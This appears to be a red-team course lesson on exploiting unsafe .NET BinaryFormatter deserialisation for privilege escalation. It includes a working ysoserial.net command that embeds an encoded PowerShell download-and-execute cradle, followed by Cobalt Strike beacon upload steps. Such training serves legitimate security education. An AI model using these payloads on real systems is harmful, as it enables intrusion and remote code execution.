# Software Vulnerabilities

Software applications may also be exploitable via traditional vulnerabilities \[[T1068](https://attack.mitre.org/techniques/T1068/)] such as buffer overflows, format strings, directory traversal, SQL or command injection, and deserialisation of untrusted data.  When such software is running in an elevated context, exploitation from a user context may result in an elevation of privilege.

The following example code reads in a binary file from an untrusted location, `C:\Temp\data.bin` and uses a BinaryFormatter to deserialise the data.  An adversary can exploit this if they can write a malicious binary blob to this location, which when deserialised, will execute their malicious code.

<figure><img src="https://lwfiles.mycourse.app/66e95234fe489daea7060790-public/add93e6be05963fe0391264577f4338f.png" alt="" width="100%"><figcaption></figcaption></figure>

[ysoserial.net](https://github.com/pwntester/ysoserial.net) is an amazing tool for creating .NET gadgets for this purpose (although the number of options is overwhelming).  In the example below, I'm using the **TypeConfuseDelegate** gadget with the **BinaryFormatter** formatter, to run a PowerShell one-liner.  I output the data in raw format and write it to `C:\Payloads\data.bin`.

1

```batch
C:\Users\Attacker>C:\Tools\ysoserial.net\ysoserial\bin\Release\ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "powershell -nop -ep bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAyADcALgAwAC4AMAAuADEAOgAzADEANAA5ADAALwAnACkA" -o raw --outputpath=C:\Payloads\data.bin
```

Simply upload the file to the target and wait for our DNS Beacon to check-in.

```batch
beacon> cd C:\Temp
beacon> upload C:\Payloads\data.bin
```
